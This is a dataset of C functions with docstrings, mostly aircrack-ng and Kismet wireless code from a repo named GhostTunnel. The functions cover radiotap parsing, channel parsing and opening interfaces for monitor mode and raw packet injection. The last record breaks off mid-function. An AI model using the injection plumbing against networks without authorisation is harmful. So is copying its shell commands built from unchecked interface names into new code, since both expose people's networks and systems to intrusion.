{"docstring": "/* local ins, m = jit.util.funcbc(func, pc) */\n", "func_signal": "LJLIB_CF(jit_util_funcbc)", "code": "{\n  GCproto *pt = check_Lproto(L, 0);\n  BCPos pc = (BCPos)lj_lib_checkint(L, 2);\n  if (pc < pt->sizebc) {\n    BCIns ins = proto_bc(pt)[pc];\n    BCOp op = bc_op(ins);\n    lua_assert(op < BC__MAX);\n    setintV(L->top, ins);\n    setintV(L->top+1, lj_bc_mode[op]);\n    L->top += 2;\n    return 2;\n  }\n  return 0;\n}", "path": "LuaJIT-2.0.4\\src\\lib_jit.c", "repo_name": "jvburnes/node9", "stars": 393, "license": "mit", "language": "c", "size": 12783}
{"docstring": "/* Parse optimization level. */\n", "func_signal": "static int jitopt_level(jit_State *J, const char *str)", "code": "{\n  if (str[0] >= '0' && str[0] <= '9' && str[1] == '\\0') {\n    uint32_t flags;\n    if (str[0] == '0') flags = JIT_F_OPT_0;\n    else if (str[0] == '1') flags = JIT_F_OPT_1;\n    else if (str[0] == '2') flags = JIT_F_OPT_2;\n    else flags = JIT_F_OPT_3;\n    J->flags = (J->flags & ~JIT_F_OPT_MASK) | flags;\n    return 1;  /* Ok. */\n  }\n  return 0;  /* No match. */\n}", "path": "LuaJIT-2.0.4\\src\\lib_jit.c", "repo_name": "jvburnes/node9", "stars": 393, "license": "mit", "language": "c", "size": 12783}
{"docstring": "/**\n * Stop the reader thread (if it is running)\n * @return 0 if stopped or -1 if it failed to stop it\n */\n", "func_signal": "static int stop_reader(struct tip_cygwin *priv)", "code": "{\n\tif (priv->tc_running == 1) {\n\t\tint tries = 3;\n\n\t\tpriv->tc_running = 0;\n\t\twhile ((priv->tc_running != -1) && tries--)\n\t\t\tsleep(1);\n\n\t\tif (tries <= 0)\n\t\t\treturn -1;\n\t}\n\n\treturn 0;\n}", "path": "src\\libwifi\\aircrack-ng\\osdep\\cygwin_tap.c", "repo_name": "PegasusLab/GhostTunnel", "stars": 313, "license": "None", "language": "c", "size": 655}
{"docstring": "/* Search a wireless tool and return its path */\n", "func_signal": "static char * wiToolsPath(const char * tool)", "code": "{\n        char * path /*, *found, *env */;\n        int i, nbelems;\n        static const char * paths [] = {\n                \"/sbin\",\n                \"/usr/sbin\",\n                \"/usr/local/sbin\",\n                \"/bin\",\n                \"/usr/bin\",\n                \"/usr/local/bin\",\n                \"/tmp\"\n        };\n\n\t// Also search in other known location just in case we haven't found it yet\n\tnbelems = sizeof(paths) / sizeof(char *);\n\tfor (i = 0; i < nbelems; i++)\n\t{\n\t\tpath = searchInside(paths[i], tool);\n\t\tif (path != NULL)\n\t\t\treturn path;\n\t}\n\n        return NULL;\n}", "path": "src\\libwifi\\aircrack-ng\\osdep\\linux.c", "repo_name": "PegasusLab/GhostTunnel", "stars": 313, "license": "None", "language": "c", "size": 655}
{"docstring": "/* end of ifconfig */\n", "func_signal": "static void get_radiotap_info(struct priv_fbsd *pf,\n\t\t\t      struct ieee80211_radiotap_header *rth, int *plen,\n\t\t\t      struct rx_info *ri)", "code": "{\n        uint32_t present;\n\tuint8_t rflags = 0;\n\tint i;\n\tunsigned char *body = (unsigned char*) (rth+1);\n\tint dbm_power = 0, db_power = 0;\n\n\t/* reset control info */\n\tif (ri)\n\t\tmemset(ri, 0, sizeof(*ri));\n\n       \t/* get info */\n\tpresent = le32toh(rth->it_present);\n\tfor (i = IEEE80211_RADIOTAP_TSFT; i <= IEEE80211_RADIOTAP_EXT; i++) {\n\t\tif (!(present & (1 << i)))\n\t\t\tcontinue;\n\n\t\tswitch (i) {\n\t\tcase IEEE80211_RADIOTAP_TSFT:\n\t\t\tbody += sizeof(uint64_t);\n\t\t\tbreak;\n\n\t\tcase IEEE80211_RADIOTAP_FLAGS:\n\t\t\trflags = *((uint8_t*)body);\n\t\t\t/* fall through */\n\t\tcase IEEE80211_RADIOTAP_RATE:\n\t\t\tbody += sizeof(uint8_t);\n\t\t\tbreak;\n\n\t\tcase IEEE80211_RADIOTAP_CHANNEL:\n\t\t\tif (ri) {\n\t\t\t\tuint16_t *p = (uint16_t*) body;\n\t\t\t\tint c = ieee80211_mhz2ieee(*p, *(p+1));\n\n\t\t\t\tri->ri_channel = c;\n\t\t\t}\n\t\t\tbody += sizeof(uint16_t)*2;\n\t\t\tbreak;\n\n\t\tcase IEEE80211_RADIOTAP_FHSS:\n\t\t\tbody += sizeof(uint16_t);\n\t\t\tbreak;\n\n\t\tcase IEEE80211_RADIOTAP_DBM_ANTSIGNAL:\n\t\t\tdbm_power = *body++;\n\t\t\tbreak;\n\n\t\tcase IEEE80211_RADIOTAP_DBM_ANTNOISE:\n\t\t\tdbm_power -= *body++;\n\t\t\tbreak;\n\n\t\tcase IEEE80211_RADIOTAP_DB_ANTSIGNAL:\n\t\t\tdb_power = *body++;\n\t\t\tbreak;\n\n\t\tcase IEEE80211_RADIOTAP_DB_ANTNOISE:\n\t\t\tdb_power -= *body++;\n\t\t\tbreak;\n\n\t\tdefault:\n\t\t\ti = IEEE80211_RADIOTAP_EXT+1;\n\t\t\tbreak;\n\t\t}\n\t}\n\n\t/* set power */\n\tif (ri) {\n\t\tif (dbm_power)\n\t\t\tri->ri_power = dbm_power;\n\t\telse\n\t\t\tri->ri_power = db_power;\n\t}\n\n        /* XXX cache; drivers won't change this per-packet */\n        /* check if FCS/CRC is included in packet */\n        if (pf->pf_nocrc || (rflags & IEEE80211_RADIOTAP_F_FCS)) {\n                *plen -= IEEE80211_CRC_LEN;\n                pf->pf_nocrc = 1;\n        }\n}", "path": "src\\libwifi\\aircrack-ng\\osdep\\freebsd.c", "repo_name": "PegasusLab/GhostTunnel", "stars": 313, "license": "None", "language": "c", "size": 655}
{"docstring": "/**\n * Change status (enable/disable) of the device\n */\n", "func_signal": "static int ti_media_status(struct tip_cygwin *priv, int on)", "code": "{\n\tULONG s = on;\n\tDWORD len;\n\n\tif (!DeviceIoControl(priv->tc_h, TAP_IOCTL_SET_MEDIA_STATUS, &s,\n\t\t\t     sizeof(s), &s, sizeof(s), &len, NULL))\n\t\treturn -1;\n\n\treturn 0;\n}", "path": "src\\libwifi\\aircrack-ng\\osdep\\cygwin_tap.c", "repo_name": "PegasusLab/GhostTunnel", "stars": 313, "license": "None", "language": "c", "size": 655}
{"docstring": "/* Convert a local interpretation of a channel back info a string;\n * 'chanstr' should hold at least STATUS_MAX characters; we'll never use\n * that many but it lets us do some cheaty stuff and re-use errstrs */\n", "func_signal": "void local_channel_to_str(local_channel_t *chan, char *chanstr)", "code": "{\n    /* Basic channel with no HT/VHT */\n    if (chan->chan_type == 0 && chan->chan_width == 0) {\n        snprintf(chanstr, STATUS_MAX, \"%u\", chan->control_freq);\n    } else if (chan->chan_type == NL80211_CHAN_HT40MINUS) {\n        snprintf(chanstr, STATUS_MAX, \"%uHT40-\", chan->control_freq);\n    } else if (chan->chan_type == NL80211_CHAN_HT40PLUS) {\n        snprintf(chanstr, STATUS_MAX, \"%uHT40+\", chan->control_freq);\n    } else {\n        /* We've got some channel width; work with them */\n        switch (chan->chan_width) {\n            case NL80211_CHAN_WIDTH_5:\n                snprintf(chanstr, STATUS_MAX, \"%uW5\", chan->control_freq);\n                break;\n            case NL80211_CHAN_WIDTH_10:\n                snprintf(chanstr, STATUS_MAX, \"%uW10\", chan->control_freq);\n                break;\n            case NL80211_CHAN_WIDTH_80:\n                if (chan->unusual_center1) {\n                    snprintf(chanstr, STATUS_MAX, \"%uVHT80-%u\",\n                            chan->control_freq, chan->center_freq1);\n                } else {\n                    snprintf(chanstr, STATUS_MAX, \"%uVHT80\", chan->control_freq);\n                }\n                break;\n            case NL80211_CHAN_WIDTH_160:\n                if (chan->unusual_center1) {\n                    snprintf(chanstr, STATUS_MAX, \"%uVHT160-%u\",\n                            chan->control_freq, chan->center_freq1);\n                } else {\n                    snprintf(chanstr, STATUS_MAX, \"%uVHT160\", chan->control_freq);\n                }\n                break;\n            default:\n                /* Just put the basic freq if we can't figure out what to do */\n                snprintf(chanstr, STATUS_MAX, \"%u\", chan->control_freq);\n                break;\n        }\n    }\n}", "path": "src\\libwifi\\kismet\\capture_linux_wifi\\capture_linux_wifi.c", "repo_name": "PegasusLab/GhostTunnel", "stars": 313, "license": "None", "language": "c", "size": 655}
{"docstring": "/* Find the next unused interface number for a given interface name */\n", "func_signal": "int find_next_ifnum(const char *basename)", "code": "{\n    int i;\n    char ifname[IFNAMSIZ];\n\n    for (i = 0; i < 100; i++) {\n        snprintf(ifname, IFNAMSIZ, \"%s%d\", basename, i);\n\n        if (if_nametoindex(ifname) == 0)\n            return i;\n    }\n\n    return -1;\n}", "path": "src\\libwifi\\kismet\\capture_linux_wifi\\capture_linux_wifi.c", "repo_name": "PegasusLab/GhostTunnel", "stars": 313, "license": "None", "language": "c", "size": 655}
{"docstring": "/* XXX */\n", "func_signal": "static int ti_is_us(struct tip_cygwin *priv, HDEVINFO *hdi,\n\t\t    SP_DEVINFO_DATA *did)", "code": "{\n\tchar buf[256];\n\tDWORD len = sizeof(buf), dt;\n\n\tif (priv) {} /* XXX unused */\n\n\tif (!SetupDiGetDeviceRegistryProperty(*hdi, did, SPDRP_DEVICEDESC, &dt,\n\t\t\t\t\t      (unsigned char*)buf, len, &len))\n\t\treturn 0;\n\n\tif (dt != REG_SZ)\n\t\treturn 0;\n\n\treturn strstr(buf, \"TAP-Win32\") != NULL;\n}", "path": "src\\libwifi\\aircrack-ng\\osdep\\cygwin_tap.c", "repo_name": "PegasusLab/GhostTunnel", "stars": 313, "license": "None", "language": "c", "size": 655}
{"docstring": "/**\n * Read registry value\n * @param key Registry key\n * @return 0 if successful, -1 if it failed\n */\n", "func_signal": "static int ti_read_reg(struct tip_cygwin *priv, char *key, char *res, int len)", "code": "{\n\tDWORD dt, l = len;\n\n\tif (RegQueryValueEx(priv->tc_key, key, NULL, &dt,\n\t    (unsigned char*) res, &l) != ERROR_SUCCESS)\n\t\treturn -1;\n\n\tif (dt != REG_SZ)\n\t\treturn -1;\n\n\tif ((int)l > len)\n\t\treturn -1;\n\n\treturn 0;\n}", "path": "src\\libwifi\\aircrack-ng\\osdep\\cygwin_tap.c", "repo_name": "PegasusLab/GhostTunnel", "stars": 313, "license": "None", "language": "c", "size": 655}
{"docstring": "/* Search a file recursively */\n", "func_signal": "static char * searchInside(const char * dir, const char * filename)", "code": "{\n    char * ret;\n    char * curfile;\n    struct stat sb;\n    int len, lentot;\n    DIR *dp;\n    struct dirent *ep;\n\n    dp = opendir(dir);\n    if (dp == NULL)\n    {\n        return NULL;\n\t}\n\n    len = strlen( filename );\n    lentot = strlen( dir ) + 256 + 2;\n    curfile = (char *) calloc( 1, lentot );\n\n    while ((ep = readdir(dp)) != NULL)\n    {\n\n        memset(curfile, 0, lentot);\n        sprintf(curfile, \"%s/%s\", dir, ep->d_name);\n\n        //Checking if it's the good file\n        if ((int)strlen( ep->d_name) == len && !strcmp(ep->d_name, filename))\n        {\n            (void)closedir(dp);\n            return curfile;\n        }\n\n        //If it's a directory and not a link, try to go inside to search\n        if ( lstat(curfile, &sb)==0 && S_ISDIR(sb.st_mode) && !S_ISLNK(sb.st_mode))\n        {\n            //Check if the directory isn't \".\" or \"..\"\n            if (strcmp(\".\", ep->d_name) && strcmp(\"..\", ep->d_name))\n            {\n                //Recursive call\n                ret = searchInside(curfile, filename);\n                if (ret != NULL)\n                {\n                    (void)closedir(dp);\n                    free( curfile );\n                    return ret;\n                }\n            }\n        }\n    }\n    (void)closedir(dp);\n    free( curfile );\n    return NULL;\n}", "path": "src\\libwifi\\aircrack-ng\\osdep\\linux.c", "repo_name": "PegasusLab/GhostTunnel", "stars": 313, "license": "None", "language": "c", "size": 655}
{"docstring": "/* tap stuff */\n", "func_signal": "char *ti_name(struct tif *ti)", "code": "{\n\tassert(ti->ti_name);\n\treturn ti->ti_name(ti);\n}", "path": "src\\libwifi\\aircrack-ng\\osdep\\osdep.c", "repo_name": "PegasusLab/GhostTunnel", "stars": 313, "license": "None", "language": "c", "size": 655}
{"docstring": "/* Convert a string into a local interpretation; allocate ret_localchan.\n */\n", "func_signal": "void *chantranslate_callback(kis_capture_handler_t *caph, char *chanstr)", "code": "{\n    local_channel_t *ret_localchan;\n    unsigned int parsechan, parse_center1;\n    char parsetype[16];\n    char mod;\n    int r;\n    unsigned int ci;\n    char errstr[STATUS_MAX];\n\n    /* Match HT40+ and HT40- */\n    r = sscanf(chanstr, \"%uHT40%c\", &parsechan, &mod);\n\n    if (r == 2) {\n        ret_localchan = (local_channel_t *) malloc(sizeof(local_channel_t));\n        memset(ret_localchan, 0, sizeof(local_channel_t));\n\n        (ret_localchan)->control_freq = wifi_chan_to_freq(parsechan);\n\n        if (mod == '-') {\n            (ret_localchan)->chan_type = NL80211_CHAN_HT40MINUS;\n            (ret_localchan)->chan_width = NL80211_CHAN_WIDTH_40;\n            (ret_localchan)->center_freq1 = (ret_localchan)->control_freq - 10;\n\n            /* Search for the ht channel record */\n            for (ci = 0; ci < MAX_WIFI_HT_CHANNEL; ci++) {\n                if (wifi_ht_channels[ci].chan == parsechan || \n                        wifi_ht_channels[ci].freq == parsechan) {\n\n                    if ((wifi_ht_channels[ci].flags & WIFI_HT_HT40MINUS) == 0) {\n                        snprintf(errstr, STATUS_MAX, \"requested channel %u as a HT40- \"\n                                \"channel; this does not appear to be a valid channel \"\n                                \"for 40MHz operation.\", parsechan);\n                        cf_send_message(caph, errstr, MSGFLAG_INFO);\n                    }\n\n                }\n            }\n        } else if (mod == '+') {\n            (ret_localchan)->chan_type = NL80211_CHAN_HT40PLUS;\n            (ret_localchan)->chan_width = NL80211_CHAN_WIDTH_40;\n            (ret_localchan)->center_freq1 = (ret_localchan)->control_freq + 10;\n\n            /* Search for the ht channel record */\n            for (ci = 0; ci < sizeof(wifi_ht_channels) / \n                    sizeof (wifi_channel); ci++) {\n                if (wifi_ht_channels[ci].chan == parsechan || \n                        wifi_ht_channels[ci].freq == parsechan) {\n\n                    if ((wifi_ht_channels[ci].flags & WIFI_HT_HT40PLUS) == 0) {\n                        snprintf(errstr, STATUS_MAX, \"requested channel %u as a HT40+ \"\n                                \"channel; this does not appear to be a valid channel \"\n                                \"for 40MHz operation.\", parsechan);\n                        cf_send_message(caph, errstr, MSGFLAG_INFO);\n                    }\n\n                }\n            }\n        } else {\n            /* otherwise return it as a basic channel; we don't know what to do */\n            snprintf(errstr, STATUS_MAX, \"unable to parse attributes on channel \"\n                    \"'%s', treating as standard non-HT channel.\", chanstr);\n            cf_send_message(caph, errstr, MSGFLAG_INFO);\n        }\n\n        return ret_localchan;\n    }\n\n\n    /* otherwise parse VHTXX, WXX, and VHTXX-YYY */\n    r = sscanf(chanstr, \"%u%15[^-]-%u\", &parsechan, parsetype, &parse_center1);\n\n    if (r <= 0) {\n        snprintf(errstr, STATUS_MAX, \"unable to parse any channel information from \"\n                \"channel string '%s'\", chanstr);\n        cf_send_message(caph, errstr, MSGFLAG_ERROR);\n        return NULL;\n    }\n\n    ret_localchan = (local_channel_t *) malloc(sizeof(local_channel_t));\n    memset(ret_localchan, 0, sizeof(local_channel_t));\n\n    if (r == 1) {\n        (ret_localchan)->control_freq = parsechan;\n        return ret_localchan;\n    }\n\n    if (r >= 2) {\n        (ret_localchan)->control_freq = parsechan;\n\n        if (strcasecmp(parsetype, \"w5\") == 0) {\n            (ret_localchan)->chan_width = NL80211_CHAN_WIDTH_5;\n        } else if (strcasecmp(parsetype, \"w10\") == 0) {\n            (ret_localchan)->chan_width = NL80211_CHAN_WIDTH_10;\n        } else if (strcasecmp(parsetype, \"vht80\") == 0) {\n            (ret_localchan)->chan_width = NL80211_CHAN_WIDTH_80;\n\n            /* Do we have a hardcoded 80mhz freq pair? */\n            if (r == 3) {\n                (ret_localchan)->center_freq1 = parse_center1;\n                (ret_localchan)->unusual_center1 = 1;\n            } else {\n                /* Search for the vht channel record to find the 80mhz center freq */\n                for (ci = 0; ci < sizeof(wifi_ht_channels) / \n                        sizeof (wifi_channel); ci++) {\n                    if (wifi_ht_channels[ci].chan == parsechan || \n                            wifi_ht_channels[ci].freq == parsechan) {\n\n                        if ((wifi_ht_channels[ci].flags & WIFI_HT_HT80) == 0) {\n                            snprintf(errstr, STATUS_MAX, \"requested channel %u as a \"\n                                    \"VHT80 channel; this does not appear to be a valid \"\n                                    \"channel for 80MHz operation, skipping channel\", \n                                    parsechan);\n                            cf_send_message(caph, errstr, MSGFLAG_ERROR);\n                            free(ret_localchan);\n                            return NULL;\n                        }\n\n                        (ret_localchan)->control_freq = wifi_ht_channels[ci].freq;\n                        (ret_localchan)->center_freq1 = wifi_ht_channels[ci].freq80;\n                        return ret_localchan;\n                    }\n                }\n\n                /* Fall through to error state if we found no valid vht80 channel */\n                snprintf(errstr, STATUS_MAX, \"requested channel %u as a \"\n                        \"VHT80 channel; this does not appear to be a valid \"\n                        \"channel for 80MHz operation, skipping channel\", \n                        parsechan);\n                cf_send_message(caph, errstr, MSGFLAG_ERROR);\n                free(ret_localchan);\n                return NULL;\n            }\n        } else if (strcasecmp(parsetype, \"vht160\") == 0) {\n            (ret_localchan)->chan_width = NL80211_CHAN_WIDTH_160;\n\n            /* Do we have a hardcoded 80mhz freq pair? */\n            if (r == 3) {\n                (ret_localchan)->center_freq1 = parse_center1;\n                (ret_localchan)->unusual_center1 = 1;\n            } else {\n                /* Search for the vht channel record to find the 160mhz center freq */\n                for (ci = 0; ci < sizeof(wifi_ht_channels) / \n                        sizeof (wifi_channel); ci++) {\n                    if (wifi_ht_channels[ci].chan == parsechan || \n                            wifi_ht_channels[ci].freq == parsechan) {\n\n                        if ((wifi_ht_channels[ci].flags & WIFI_HT_HT160) == 0) {\n                            snprintf(errstr, STATUS_MAX, \"requested channel %u as a \"\n                                    \"VHT160 channel; this does not appear to be a \"\n                                    \"valid channel for 160MHz operation, skipping \"\n                                    \"channel\", parsechan);\n                            cf_send_message(caph, errstr, MSGFLAG_ERROR);\n                            free(ret_localchan);\n                            return NULL;\n                        }\n\n                        (ret_localchan)->control_freq = wifi_ht_channels[ci].freq;\n                        (ret_localchan)->center_freq1 = wifi_ht_channels[ci].freq160;\n                        return ret_localchan;\n                    }\n                }\n\n                /* Fall through to an error if we never found a vht160 for this */\n                snprintf(errstr, STATUS_MAX, \"requested channel %u as a \"\n                        \"VHT160 channel; this does not appear to be a \"\n                        \"valid channel for 160MHz operation, skipping \"\n                        \"channel\", parsechan);\n                cf_send_message(caph, errstr, MSGFLAG_ERROR);\n                free(ret_localchan);\n                return NULL;\n            }\n        } else {\n            /* otherwise return it as a basic channel; we don't know what to do */\n            snprintf(errstr, STATUS_MAX, \"unable to parse attributes on channel \"\n                    \"'%s', treating as standard non-HT channel.\", chanstr);\n            cf_send_message(caph, errstr, MSGFLAG_INFO);\n        }\n\n    }\n\n    return ret_localchan;\n}", "path": "src\\libwifi\\kismet\\capture_linux_wifi\\capture_linux_wifi.c", "repo_name": "PegasusLab/GhostTunnel", "stars": 313, "license": "None", "language": "c", "size": 655}
{"docstring": "/* from ifconfig */\n", "func_signal": "static __inline int\nmapgsm(u_int freq, u_int flags)", "code": "{\n        freq *= 10;\n        if (flags & IEEE80211_CHAN_QUARTER)\n                freq += 5;\n        else if (flags & IEEE80211_CHAN_HALF)\n                freq += 10;\n        else\n                freq += 20;\n        /* NB: there is no 907/20 wide but leave room */\n        return (freq - 906*10) / 5;\n}", "path": "src\\libwifi\\aircrack-ng\\osdep\\freebsd.c", "repo_name": "PegasusLab/GhostTunnel", "stars": 313, "license": "None", "language": "c", "size": 655}
{"docstring": "/*\n * Open the interface and set mode monitor\n * Return 1 on failure and 0 on success\n */\n", "func_signal": "static int do_linux_open(struct wif *wi, char *iface)", "code": "{\n    int kver, unused;\n    struct utsname checklinuxversion;\n    struct priv_linux *dev = wi_priv(wi);\n    char *iwpriv = NULL;\n    char strbuf[512];\n    FILE *f;\n    char athXraw[] = \"athXraw\";\n    pid_t pid;\n    int n;\n    DIR *net_ifaces;\n    struct dirent *this_iface;\n    FILE *acpi;\n\tchar buf[128];\n    char * r_file = NULL;\n    struct ifreq ifr;\n    char * unused_str;\n    int iface_malloced = 0;\n\n    if (iface == NULL || strlen(iface) >= IFNAMSIZ) {\n        return ( 1 );\n    }\n\n    dev->inject_wlanng = 1;\n    dev->rate = 2; /* default to 1Mbps if nothing is set */\n\n    /* open raw socks */\n    if( ( dev->fd_in = socket( PF_PACKET, SOCK_RAW,\n                              htons( ETH_P_ALL ) ) ) < 0 )\n    {\n        perror( \"socket(PF_PACKET) failed\" );\n        if( getuid() != 0 )\n            fprintf( stderr, \"This program requires root privileges.\\n\" );\n        return( 1 );\n    }\n\n    if( ( dev->fd_main = socket( PF_PACKET, SOCK_RAW,\n                              htons( ETH_P_ALL ) ) ) < 0 )\n    {\n        perror( \"socket(PF_PACKET) failed\" );\n        if( getuid() != 0 )\n            fprintf( stderr, \"This program requires root privileges.\\n\" );\n        return( 1 );\n    }\n\n        /* Check iwpriv existence */\n\tiwpriv = wiToolsPath(\"iwpriv\");\n\n#ifndef CONFIG_LIBNL\n    dev->iwpriv = iwpriv;\n    dev->iwconfig = wiToolsPath(\"iwconfig\");\n    dev->ifconfig = wiToolsPath(\"ifconfig\");\n\n    if (! iwpriv )\n    {\n        fprintf(stderr, \"Can't find wireless tools, exiting.\\n\");\n        goto close_in;\n    }\n#endif\n\n    /* Exit if ndiswrapper : check iwpriv ndis_reset */\n\n    if ( is_ndiswrapper(iface, iwpriv ) )\n    {\n        fprintf(stderr, \"Ndiswrapper doesn't support monitor mode.\\n\");\n        goto close_in;\n    }\n\n    if( ( dev->fd_out = socket( PF_PACKET, SOCK_RAW,\n                               htons( ETH_P_ALL ) ) ) < 0 )\n    {\n        perror( \"socket(PF_PACKET) failed\" );\n        goto close_in;\n    }\n    /* figure out device type */\n\n    /* mac80211 radiotap injection\n     * detected based on interface called mon...\n     * since mac80211 allows multiple virtual interfaces\n     *\n     * note though that the virtual interfaces are ultimately using a\n     * single physical radio: that means for example they must all\n     * operate on the same channel\n     */\n\n    /* mac80211 stack detection */\n    memset(strbuf, 0, sizeof(strbuf));\n    snprintf(strbuf, sizeof(strbuf) - 1,\n            \"ls /sys/class/net/%s/phy80211/subsystem >/dev/null 2>/dev/null\", iface);\n\n    if (system(strbuf) == 0)\n        dev->drivertype = DT_MAC80211_RT;\n\n    /* IPW2200 detection */\n    memset(strbuf, 0, sizeof(strbuf));\n    snprintf(strbuf, sizeof(strbuf) - 1,\n            \"ls /sys/class/net/%s/device/inject >/dev/null 2>/dev/null\", iface);\n\n    if (system(strbuf) == 0)\n        dev->drivertype = DT_IPW2200;\n\n    /* BCM43XX detection */\n    memset(strbuf, 0, sizeof(strbuf));\n    snprintf(strbuf, sizeof(strbuf) - 1,\n            \"ls /sys/class/net/%s/device/inject_nofcs >/dev/null 2>/dev/null\", iface);\n\n    if (system(strbuf) == 0)\n        dev->drivertype = DT_BCM43XX;\n\n    /* check if wlan-ng or hostap or r8180 */\n    if( strlen(iface) == 5 &&\n        memcmp(iface, \"wlan\", 4 ) == 0 )\n    {\n        memset( strbuf, 0, sizeof( strbuf ) );\n        snprintf( strbuf,  sizeof( strbuf ) - 1,\n                  \"wlancfg show %s 2>/dev/null | \"\n                  \"grep p2CnfWEPFlags >/dev/null\",\n                  iface);\n\n        if( system( strbuf ) == 0 )\n        {\n            if (uname( & checklinuxversion ) >= 0)\n            {\n                /* uname succeeded */\n                if (strncmp(checklinuxversion.release, \"2.6.\", 4) == 0\n                    && strncasecmp(checklinuxversion.sysname, \"linux\", 5) == 0)\n                {\n                    /* Linux kernel 2.6 */\n                    kver = atoi(checklinuxversion.release + 4);\n\n                    if (kver > 11)\n                    {\n                        /* That's a kernel > 2.6.11, cannot inject */\n                        dev->inject_wlanng = 0;\n                    }\n                }\n            }\n            dev->drivertype = DT_WLANNG;\n            dev->wlanctlng = wiToolsPath(\"wlanctl-ng\");\n        }\n\n        memset( strbuf, 0, sizeof( strbuf ) );\n        snprintf( strbuf,  sizeof( strbuf ) - 1,\n                  \"iwpriv %s 2>/dev/null | \"\n                  \"grep antsel_rx >/dev/null\",\n                  iface);\n\n        if( system( strbuf ) == 0 )\n            dev->drivertype=DT_HOSTAP;\n\n        memset( strbuf, 0, sizeof( strbuf ) );\n        snprintf( strbuf,  sizeof( strbuf ) - 1,\n                    \"iwpriv %s 2>/dev/null | \"\n                    \"grep  GetAcx111Info  >/dev/null\",\n                    iface);\n\n        if( system( strbuf ) == 0 )\n            dev->drivertype=DT_ACX;\n    }\n\n    /* enable injection on ralink */\n\n    if( strcmp( iface, \"ra0\" ) == 0 ||\n        strcmp( iface, \"ra1\" ) == 0 ||\n        strcmp( iface, \"rausb0\" ) == 0 ||\n        strcmp( iface, \"rausb1\" ) == 0 )\n    {\n        memset( strbuf, 0, sizeof( strbuf ) );\n        snprintf( strbuf,  sizeof( strbuf ) - 1,\n                  \"iwpriv %s rfmontx 1 >/dev/null 2>/dev/null\",\n                  iface );\n        unused = system( strbuf );\n    }\n\n    /* check if newer athXraw interface available */\n\n    if( ( strlen( iface ) >= 4 || strlen( iface ) <= 6 )\n        && memcmp( iface, \"ath\", 3 ) == 0 )\n    {\n        dev->drivertype = DT_MADWIFI;\n        memset( strbuf, 0, sizeof( strbuf ) );\n\n        snprintf(strbuf, sizeof( strbuf ) -1,\n                  \"/proc/sys/net/%s/%%parent\", iface);\n\n        f = fopen(strbuf, \"r\");\n\n        if (f != NULL)\n        {\n            // It is madwifi-ng\n            dev->drivertype=DT_MADWIFING;\n            fclose( f );\n\n            /* should we force prism2 header? */\n\n            sprintf((char *) strbuf, \"/proc/sys/net/%s/dev_type\", iface);\n            f = fopen( (char *) strbuf,\"w\");\n            if (f != NULL) {\n                fprintf(f, \"802\\n\");\n                fclose(f);\n            }\n\n            /* Force prism2 header on madwifi-ng */\n        }\n        else\n        {\n            // Madwifi-old\n            memset( strbuf, 0, sizeof( strbuf ) );\n            snprintf( strbuf,  sizeof( strbuf ) - 1,\n                      \"sysctl -w dev.%s.rawdev=1 >/dev/null 2>/dev/null\",\n                      iface );\n\n            if( system( strbuf ) == 0 )\n            {\n\n                athXraw[3] = iface[3];\n\n                memset( strbuf, 0, sizeof( strbuf ) );\n                snprintf( strbuf,  sizeof( strbuf ) - 1,\n                          \"ifconfig %s up\", athXraw );\n                unused = system( strbuf );\n\n#if 0 /* some people reported problems when prismheader is enabled */\n                memset( strbuf, 0, sizeof( strbuf ) );\n                snprintf( strbuf,  sizeof( strbuf ) - 1,\n                         \"sysctl -w dev.%s.rawdev_type=1 >/dev/null 2>/dev/null\",\n                         iface );\n                unused = system( strbuf );\n#endif\n\n                iface = athXraw;\n            }\n        }\n    }\n\n    /* test if orinoco */\n\n    if( memcmp( iface, \"eth\", 3 ) == 0 )\n    {\n        if( ( pid = fork() ) == 0 )\n        {\n            close( 0 ); close( 1 ); close( 2 ); unused = chdir( \"/\" );\n            execlp( \"iwpriv\", \"iwpriv\", iface, \"get_port3\", NULL );\n            exit( 1 );\n        }\n\n        waitpid( pid, &n, 0 );\n\n        if( WIFEXITED(n) && WEXITSTATUS(n) == 0 )\n            dev->drivertype=DT_ORINOCO;\n\n        memset( strbuf, 0, sizeof( strbuf ) );\n        snprintf( strbuf,  sizeof( strbuf ) - 1,\n                  \"iwpriv %s 2>/dev/null | \"\n                  \"grep get_scan_times >/dev/null\",\n                  iface);\n\n        if( system( strbuf ) == 0 )\n            dev->drivertype=DT_AT76USB;\n    }\n\n    /* test if zd1211rw */\n\n    if( memcmp( iface, \"eth\", 3 ) == 0 )\n    {\n        if( ( pid = fork() ) == 0 )\n        {\n            close( 0 ); close( 1 ); close( 2 ); unused = chdir( \"/\" );\n            execlp( \"iwpriv\", \"iwpriv\", iface, \"get_regdomain\", NULL );\n            exit( 1 );\n        }\n\n        waitpid( pid, &n, 0 );\n\n        if( WIFEXITED(n) && WEXITSTATUS(n) == 0 )\n            dev->drivertype=DT_ZD1211RW;\n    }\n\n    if( dev->drivertype == DT_IPW2200 )\n    {\n        r_file = (char *)calloc(33 + strlen(iface) + 1, sizeof(char));\n        if (!r_file) {\n            goto close_out;\n        }\n        snprintf(r_file, 33 + strlen(iface) + 1,\n            \"/sys/class/net/%s/device/rtap_iface\", iface);\n\n        if ((acpi = fopen(r_file, \"r\")) == NULL)\n            goto close_out;\n        memset(buf, 0, 128);\n        unused_str = fgets(buf, 128, acpi);\n        buf[127]='\\x00';\n        //rtap iface doesn't exist\n        if(strncmp(buf, \"-1\", 2) == 0)\n        {\n            //repoen for writing\n            fclose(acpi);\n            if ((acpi = fopen(r_file, \"w\")) == NULL)\n                goto close_out;\n            fputs(\"1\", acpi);\n            //reopen for reading\n            fclose(acpi);\n            if ((acpi = fopen(r_file, \"r\")) == NULL)\n                goto close_out;\n            unused_str = fgets(buf, 128, acpi);\n        }\n        fclose(acpi);\n\n        //use name in buf as new iface and set original iface as main iface\n        dev->main_if = (char*) malloc(strlen(iface)+1);\n        memset(dev->main_if, 0, strlen(iface)+1);\n        strncpy(dev->main_if, iface, strlen(iface));\n\n        iface=(char*)malloc(strlen(buf)+1);\n        iface_malloced = 1;\n        memset(iface, 0, strlen(buf)+1);\n        strncpy(iface, buf, strlen(buf));\n    }\n\n    /* test if rtap interface and try to find real interface */\n    if( memcmp( iface, \"rtap\", 4) == 0 && dev->main_if == NULL)\n    {\n        memset( &ifr, 0, sizeof( ifr ) );\n        strncpy( ifr.ifr_name, iface, sizeof( ifr.ifr_name ) - 1 );\n\n        n = 0;\n\n        if( ioctl( dev->fd_out, SIOCGIFINDEX, &ifr ) < 0 )\n        {\n            //create rtap interface\n            n = 1;\n        }\n\n        net_ifaces = opendir(\"/sys/class/net\");\n        if ( 